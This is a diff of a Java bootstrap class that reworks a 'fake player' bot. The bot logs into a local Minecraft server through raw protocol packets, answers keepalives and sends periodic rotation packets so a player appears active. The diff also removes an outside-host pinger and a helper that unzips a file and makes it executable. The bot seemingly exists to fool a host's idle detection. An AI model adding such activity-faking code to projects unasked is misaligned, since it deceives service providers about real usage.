+                    System.out.println(ANSI_YELLOW + "[FakePlayer] Still waiting... (" + (i * 5) + "s)" + ANSI_RESET);
                 }
             }
         }
         
-        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout waiting for server, trying anyway..." + ANSI_RESET);
+        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout, trying anyway..." + ANSI_RESET);
     }
     
-    private static boolean isFakePlayerBotEnabled(Map<String, String> config) {
-        String enabled = config.get("FAKE_PLAYER_ENABLED");
-        return enabled != null && enabled.equalsIgnoreCase("true");
+    private static int getMcPort(Map<String, String> config) {
+        String portStr = config.get("MC_PORT");
+        if (portStr == null || portStr.trim().isEmpty()) {
+            return 25565;
+        }
+        
+        try {
+            return Integer.parseInt(portStr.trim());
+        } catch (NumberFormatException e) {
+            System.out.println(ANSI_YELLOW + "[FakePlayer] Invalid MC_PORT, using default: 25565" + ANSI_RESET);
+            return 25565;
+        }
     }
     
     private static void startFakePlayerBot(Map<String, String> config) {
-        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "labubu");
-        int mcPort = Integer.parseInt(config.getOrDefault("MC_PORT", "25835"));
+        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
+        int mcPort = getMcPort(config);
+        String activityLevel = config.getOrDefault("FAKE_PLAYER_ACTIVITY", "low");
 
         System.out.println(ANSI_GREEN + "[FakePlayer] Starting fake player bot: " + playerName + ANSI_RESET);
         System.out.println(ANSI_GREEN + "[FakePlayer] Target: 127.0.0.1:" + mcPort + ANSI_RESET);
-        System.out.println(ANSI_GREEN + "[FakePlayer] Protocol: 1.21.4/1.21.11 (Smart Scan 0x20-0x30 -> Send 0x1B)" + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "[FakePlayer] Protocol: 1.21.4 (774)" + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "[FakePlayer] Activity Level: " + activityLevel.toUpperCase() + ANSI_RESET);
 
-        keepaliveThread = new Thread(() -> {
-            int failCount = 0;
-            byte[] trashBuffer = new byte[65536]; 
-
+        fakePlayerThread = new Thread(() -> {
             while (running.get()) {
                 Socket socket = null;
+                int heartbeatCount = 0;
+                int actionCount = 0;
+                long sessionStartTime = System.currentTimeMillis();
+                
                 try {
                     System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
 
                     socket = new Socket();
-                    socket.setReceiveBufferSize(1024 * 1024 * 10); 
+                    socket.setReceiveBufferSize(10 * 1024 * 1024);
                     socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
-                    socket.setSoTimeout(60000); 
+                    socket.setSoTimeout(5000); // 设置5秒超时，防止无限等待
 
                     DataOutputStream out = new DataOutputStream(socket.getOutputStream());
-                    DataInputStream in = new DataInputStream(new java.io.BufferedInputStream(socket.getInputStream()));
+                    DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
 
                     // Handshake
                     ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
@@ -668,7 +450,7 @@ public class Bootstrap
                     writeVarInt(handshake, 774);
                     writeString(handshake, "127.0.0.1");
                     handshake.writeShort(mcPort);
-                    writeVarInt(handshake, 2); 
+                    writeVarInt(handshake, 2);
                     byte[] handshakeData = handshakeBuf.toByteArray();
                     writeVarInt(out, handshakeData.length);
                     out.write(handshakeData);
@@ -679,7 +461,7 @@ public class Bootstrap
                     DataOutputStream login = new DataOutputStream(loginBuf);
                     writeVarInt(login, 0x00);
                     writeString(login, playerName);
-                    java.util.UUID playerUUID = java.util.UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
+                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                     login.writeLong(playerUUID.getMostSignificantBits());
                     login.writeLong(playerUUID.getLeastSignificantBits());
                     byte[] loginData = loginBuf.toByteArray();
@@ -688,18 +470,26 @@ public class Bootstrap
                     out.flush();
 
                     System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
-                    failCount = 0;
 
                     boolean configPhase = false;
                     boolean playPhase = false;
                     boolean compressionEnabled = false;
                     int compressionThreshold = -1;
+                    
+                    long lastActivityTime = System.currentTimeMillis();
+                    long lastMajorActionTime = System.currentTimeMillis();
 
                     while (running.get() && !socket.isClosed()) {
                         try {
+                            // 关键优化：检查是否有可用数据
+                            if (in.available() == 0) {
+                                Thread.sleep(100); // 没有数据时休眠100ms，避免CPU空转
+                                continue;
+                            }
+                            
                             int packetLength = readVarInt(in);
-                            if (packetLength < 0 || packetLength > 100000000) { 
-                                 throw new java.io.IOException("Bad packet size: " + packetLength);
+                            if (packetLength < 0 || packetLength > 100000000) {
+                                throw new IOException("Bad packet size");
                             }
 
                             byte[] packetData = null;
@@ -707,31 +497,21 @@ public class Bootstrap
                             if (compressionEnabled) {
                                 int dataLength = readVarInt(in);
                                 int compressedLength = packetLength - getVarIntSize(dataLength);
-                                
                                 byte[] compressedData = new byte[compressedLength];
                                 in.readFully(compressedData);
 
                                 if (dataLength == 0) {
-                                    packetData = compressedData; 
-                                } else {
-                                    if (dataLength > 8192) {
-                                        packetData = null;
-                                    } else {
-                                        try {
-                                            java.util.zip.Inflater inflater = new java.util.zip.Inflater();
-                                            inflater.setInput(compressedData);
-                                            packetData = new byte[dataLength];
-                                            inflater.inflate(packetData);
-                                            inflater.end();
-                                        } catch (Exception e) {
-                                            packetData = null;
-                                        }
-                                    }
+                                    packetData = compressedData;
+                                } else if (dataLength <= 8192) {
+                                    java.util.zip.Inflater inflater = new java.util.zip.Inflater();
+                                    inflater.setInput(compressedData);
+                                    packetData = new byte[dataLength];
+                                    inflater.inflate(packetData);
+                                    inflater.end();
                                 }
                             } else {
-                                byte[] rawData = new byte[packetLength];
-                                in.readFully(rawData);
-                                packetData = rawData;
+                                packetData = new byte[packetLength];
+                                in.readFully(packetData);
                             }
 
                             if (packetData == null) continue;
@@ -742,44 +522,45 @@ public class Bootstrap
 
                             if (!playPhase) {
                                 if (!configPhase) {
-                                    // Login
-                                    if (packetId == 0x03) { 
+                                    // Login Phase
+                                    if (packetId == 0x03) {
                                         compressionThreshold = readVarInt(packetIn);
                                         compressionEnabled = compressionThreshold >= 0;
                                         System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
-                                    } else if (packetId == 0x02) { 
+                                    } else if (packetId == 0x02) {
                                         System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
-                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
-                                        DataOutputStream ack = new DataOutputStream(ackBuf);
-                                        writeVarInt(ack, 0x03); 
-                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
-                                        configPhase = true;
-
-                                        // Client Settings
-                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
-                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
-                                        writeVarInt(info, 0x00); 
-                                        writeString(info, "en_US"); 
-                                        info.writeByte(10); 
-                                        writeVarInt(info, 0); 
-                                        info.writeBoolean(true); 
-                                        info.writeByte(127); 
-                                        writeVarInt(info, 1); 
-                                        info.writeBoolean(false); 
-                                        info.writeBoolean(true);
-                                        writeVarInt(info, 0); 
-                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
-                                    }
-                                } else {
-                                    // Config
-                                    if (packetId == 0x03) {
-                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                         ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                         DataOutputStream ack = new DataOutputStream(ackBuf);
                                         writeVarInt(ack, 0x03);
                                         sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
-                                        playPhase = true; 
-                                    } else if (packetId == 0x04) {
+                                        configPhase = true;
+
+                                        // Send Client Information
+                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
+                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
+                                        writeVarInt(info, 0x00);
+                                        writeString(info, "en_US");
+                                        info.writeByte(10);
+                                        writeVarInt(info, 0);
+                                        info.writeBoolean(true);
+                                        info.writeByte(127);
+                                        writeVarInt(info, 1);
+                                        info.writeBoolean(false);
+                                        info.writeBoolean(true);
+                                        writeVarInt(info, 0);
+                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
+                                    }
+                                } else {
+                                    // Config Phase
+                                    if (packetId == 0x03) {
+                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished, entering Play phase..." + ANSI_RESET);
+                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
+                                        DataOutputStream ack = new DataOutputStream(ackBuf);
+                                        writeVarInt(ack, 0x03);
+                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
+                                        playPhase = true;
+                                        heartbeatCount = 0;
+                                    } else if (packetId == 0x04 && packetIn.available() >= 8) {
                                         long id = packetIn.readLong();
                                         ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                         DataOutputStream ack = new DataOutputStream(ackBuf);
@@ -789,59 +570,109 @@ public class Bootstrap
                                     } else if (packetId == 0x0E) {
                                         ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                         DataOutputStream bufOut = new DataOutputStream(buf);
-                                        writeVarInt(bufOut, 0x07); 
+                                        writeVarInt(bufOut, 0x07);
                                         writeVarInt(bufOut, 0);
                                         sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                     }
                                 }
                             } else {
                                 // Play Phase
-                                if (packetId >= 0x20 && packetId <= 0x30) { 
-                                    if (packetIn.available() == 8) {
-                                        long keepAliveId = packetIn.readLong();
-                                        System.out.println(ANSI_GREEN + "[FakePlayer] Heartbeat Detect (ID: 0x" + Integer.toHexString(packetId) + ") Val: " + keepAliveId + ANSI_RESET);
-                                        
-                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
-                                        DataOutputStream bufOut = new DataOutputStream(buf);
-                                        writeVarInt(bufOut, 0x1B); 
-                                        bufOut.writeLong(keepAliveId);
-                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
+                                long currentTime = System.currentTimeMillis();
+                                
+                                // Detect and respond to KeepAlive packets
+                                if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
+                                    long keepAliveId = packetIn.readLong();
+                                    heartbeatCount++;
+                                    
+                                    System.out.println(ANSI_GREEN + "[FakePlayer] ♥ Heartbeat #" + heartbeatCount + 
+                                        " (ID: 0x" + Integer.toHexString(packetId) + ") Val: " + keepAliveId + 
+                                        " [Actions: " + actionCount + "]" + ANSI_RESET);
+                                    
+                                    // Reply to KeepAlive
+                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                                    DataOutputStream bufOut = new DataOutputStream(buf);
+                                    writeVarInt(bufOut, 0x1B);
+                                    bufOut.writeLong(keepAliveId);
+                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
+                                    
+                                    // 等待10个心跳后再开始活动，确保稳定
+                                    if (heartbeatCount >= 10) {
+                                        // 5分钟执行一次主要活动 (300秒)
+                                        if (currentTime - lastMajorActionTime > 300000) {
+                                            performMajorActivity(out, compressionEnabled, compressionThreshold);
+                                            actionCount++;
+                                            lastMajorActionTime = currentTime;
+                                            lastActivityTime = currentTime;
+                                        }
+                                    } else {
+                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Stabilizing... (heartbeat " + 
+                                            heartbeatCount + "/10)" + ANSI_RESET);
                                     }
                                 }
-                                else if (packetId == 0x1D || (packetId == 0x00 && packetData.length > 3)) { 
-                                    System.out.println(ANSI_RED + "[FakePlayer] Kicked." + ANSI_RESET);
-                                    break; 
+                                
+                                // Disconnect packet
+                                if (packetId == 0x1D) {
+                                    System.out.println(ANSI_RED + "[FakePlayer] Kicked. Session lasted: " + 
+                                        ((currentTime - sessionStartTime) / 1000) + "s, Actions: " + actionCount + ANSI_RESET);
+                                    break;
                                 }
                             }
 
                         } catch (java.net.SocketTimeoutException e) {
-                             continue;
-                        } catch (java.io.EOFException e) {
-                            System.out.println(ANSI_RED + "[FakePlayer] EOF (Server Closed)" + ANSI_RESET);
-                            break;
+                            // 超时是正常的，添加短暂休眠避免CPU空转
+                            Thread.sleep(100);
+                            continue;
                         } catch (Exception e) {
-                            System.out.println(ANSI_RED + "[FakePlayer] Error: " + e.toString() + ANSI_RESET);
+                            System.out.println(ANSI_RED + "[FakePlayer] Packet error: " + e.getMessage() + ANSI_RESET);
                             break;
                         }
                     }
 
-                    if (socket != null) socket.close();
-                    System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 10s..." + ANSI_RESET);
-                    Thread.sleep(10000);
+                    if (socket != null && !socket.isClosed()) {
+                        try { socket.close(); } catch (Exception e) {}
+                    }
+                    System.out.println(ANSI_YELLOW + "[FakePlayer] Session ended. Total actions: " + actionCount + ANSI_RESET);
+                    System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 30s..." + ANSI_RESET);
+                    Thread.sleep(30000); // 增加重连间隔到30秒
 
                 } catch (java.net.ConnectException e) {
-                    System.out.println(ANSI_YELLOW + "[FakePlayer] Waiting for server... (5s)" + ANSI_RESET);
-                    try { Thread.sleep(5000); } catch (InterruptedException ex) { break; }
+                    System.out.println(ANSI_YELLOW + "[FakePlayer] Server offline, retrying in 60s..." + ANSI_RESET);
+                    try { Thread.sleep(60000); } catch (InterruptedException ex) { break; }
+                } catch (InterruptedException e) {
+                    break;
                 } catch (Exception e) {
-                    failCount++;
-                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connection Failed: " + e.getMessage() + ANSI_RESET);
-                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
+                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connection error: " + e.getMessage() + ANSI_RESET);
+                    try { Thread.sleep(30000); } catch (InterruptedException ex) { break; }
                 }
             }
         });
 
-        keepaliveThread.setDaemon(true);
-        keepaliveThread.start();
+        fakePlayerThread.setDaemon(true);
+        fakePlayerThread.start();
+    }
+    
+    private static void performMajorActivity(DataOutputStream out, boolean compress, int threshold) {
+        try {
+            System.out.println(ANSI_GREEN + "[FakePlayer] ★ MAJOR ACTIVITY: 360° rotation (slow & smooth)" + ANSI_RESET);
+            
+            // 慢速平滑旋转，减少服务器负载
+            for (int i = 0; i < 12; i++) {
+                Thread.sleep(500); // 每次旋转间隔500ms
+                
+                ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
+                DataOutputStream rot = new DataOutputStream(rotBuf);
+                writeVarInt(rot, 0x1F);
+                rot.writeFloat((float)(i * 30)); // 每次旋转30度
+                rot.writeFloat((float)(Math.sin(i * 0.5) * 10)); // 轻微上下移动
+                rot.writeBoolean(true);
+                sendPacket(out, rotBuf.toByteArray(), compress, threshold);
+            }
+            
+            System.out.println(ANSI_GREEN + "[FakePlayer] ★ Activity completed (360° smooth rotation)" + ANSI_RESET);
+            
+        } catch (Exception e) {
+            System.out.println(ANSI_RED + "[FakePlayer] Activity error: " + e.getMessage() + ANSI_RESET);
+        }
     }
     
     private static int getVarIntSize(int value) {
@@ -898,95 +729,6 @@ public class Bootstrap
         return out.toByteArray();
     }
     
-    private static boolean isMcKeepaliveEnabled(Map<String, String> config) {
-        String host = config.get("MC_KEEPALIVE_HOST");
-        return host != null && !host.trim().isEmpty();
-    }
-    
-    private static void startMcKeepalive(Map<String, String> config) {
-        String host = config.get("MC_KEEPALIVE_HOST");
-        int port = Integer.parseInt(config.getOrDefault("MC_KEEPALIVE_PORT", "25565"));
-        
-        System.out.println(ANSI_GREEN + "[MC-Keepalive] Starting player simulation to " + host + ":" + port + ANSI_RESET);
-        
-        keepaliveThread = new Thread(() -> {
-            int failCount = 0;
-            while (running.get()) {
-                try {
-                    pingMinecraftServer(host, port);
-                    failCount = 0;
-                    System.out.println(ANSI_GREEN + "[MC-Keepalive] ✓ Player ping successful" + ANSI_RESET);
-                    Thread.sleep(300000);
-                } catch (InterruptedException e) {
-                    break;
-                } catch (Exception e) {
-                    failCount++;
-                    if (failCount <= 3) {
-                        System.out.println(ANSI_YELLOW + "[MC-Keepalive] Ping failed (" + failCount + "/3): " + e.getMessage() + ANSI_RESET);
-                        if (failCount == 3) {
-                            System.out.println(ANSI_YELLOW + "[MC-Keepalive] Continuing silently..." + ANSI_RESET);
-                        }
-                    }
-                    try {
-                        Thread.sleep(60000);
-                    } catch (InterruptedException ex) {
-                        break;
-                    }
-                }
-            }
-        });
-        keepaliveThread.setDaemon(true);
-        keepaliveThread.start();
-    }
-    
-    private static void pingMinecraftServer(String host, int port) throws IOException {
-        try (Socket socket = new Socket()) {
-            socket.connect(new InetSocketAddress(host, port), 5000);
-            socket.setSoTimeout(5000);
-            
-            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
-            DataInputStream in = new DataInputStream(socket.getInputStream());
-            
-            ByteArrayOutputStream buf = new ByteArrayOutputStream();
-            DataOutputStream packet = new DataOutputStream(buf);
-            
-            writeVarInt(packet, 0x00);
-            writeVarInt(packet, 47);
-            writeString(packet, host);
-            packet.writeShort(port);
-            writeVarInt(packet, 1);
-            
-            byte[] handshake = buf.toByteArray();
-            writeVarInt(out, handshake.length);
-            out.write(handshake);
-            
-            buf.reset();
-            packet = new DataOutputStream(buf);
-            writeVarInt(packet, 0x00);
-            
-            byte[] request = buf.toByteArray();
-            writeVarInt(out, request.length);
-            out.write(request);
-            out.flush();
-            
-            try {
-                int length = readVarInt(in);
-                if (length > 0 && length < 32767) {
-                    int packetId = readVarInt(in);
-                    if (packetId == 0x00) {
-                        int jsonLength = readVarInt(in);
-                        if (jsonLength > 0 && jsonLength < 32767) {
-                            return;
-                        }
-                    }
-                }
-            } catch (Exception e) {
-            }
-            
-            throw new IOException("Invalid or no response from server");
-        }
-    }
-    
     private static void writeVarInt(DataOutputStream out, int value) throws IOException {
         while ((value & 0xFFFFFF80) != 0) {
             out.writeByte((value & 0x7F) | 0x80);
@@ -1001,13 +743,6 @@ public class Bootstrap
         out.write(bytes);
     }
     
-    private static String readString(DataInputStream in) throws IOException {
-        int len = readVarInt(in);
-        byte[] bytes = new byte[len];
-        in.readFully(bytes);
-        return new String(bytes, "UTF-8");
-    }
-
     private static int readVarInt(DataInputStream in) throws IOException {
         int value = 0;
         int length = 0;
@@ -1019,29 +754,5 @@ public class Bootstrap
             if (length > 5) throw new IOException("VarInt too big");
         } while ((currentByte & 0x80) == 0x80);
         return value;
-    }
-    
-    private static void unzipFile(Path zipPath, Path destDir, String targetFile) throws IOException {
-        Files.createDirectories(destDir);
-        
-        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipPath.toFile()))) {
-            ZipEntry entry;
-            while ((entry = zis.getNextEntry()) != null) {
-                if (entry.getName().equals(targetFile) || entry.getName().endsWith("/" + targetFile)) {
-                    Path outPath = destDir.resolve(targetFile);
-                    try (FileOutputStream fos = new FileOutputStream(outPath.toFile())) {
-                        byte[] buffer = new byte[8192];
-                        int len;
-                        while ((len = zis.read(buffer)) > 0) {
-                            fos.write(buffer, 0, len);
-                        }
-                    }
-                    outPath.toFile().setExecutable(true);
-                    System.out.println("Extracted: " + targetFile);
-                    break;
-                }
-                zis.closeEntry();
-            }
-        }
     }
 }
